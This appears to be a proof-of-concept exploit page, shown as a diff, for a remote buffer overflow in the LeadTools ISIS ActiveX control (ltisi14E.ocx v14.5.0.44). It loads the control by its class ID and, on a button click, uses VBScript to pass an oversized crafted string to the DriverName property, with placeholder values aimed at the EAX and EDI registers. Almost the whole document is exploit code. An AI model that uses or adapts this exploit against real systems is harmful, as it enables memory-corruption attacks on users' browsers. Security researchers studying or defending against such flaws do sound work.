@@ -1,0 +1,28 @@
+-----------------------------------------------------------------------------------
+ MoAxB #22:
+ LeadTools ISIS Control (ltisi14E.ocx v. 14.5.0.44) Remote Buffer Overflow Exploit
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+-----------------------------------------------------------------------------------
+
+<object classid='clsid:00140050-B1BA-11CE-ABC6-F5B2E79D9E3F' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language='vbscript'>
+ Sub tryMe
+  buff = String(752, "A")
+
+  get_EAX = "aaaa"
+
+  get_EDI = "bbbb"
+
+  buff1 = String(7240, "B")
+
+  egg = buff + get_EDI + get_EAX + buff1
+
+  test.DriverName = egg
+ End Sub
+</script>
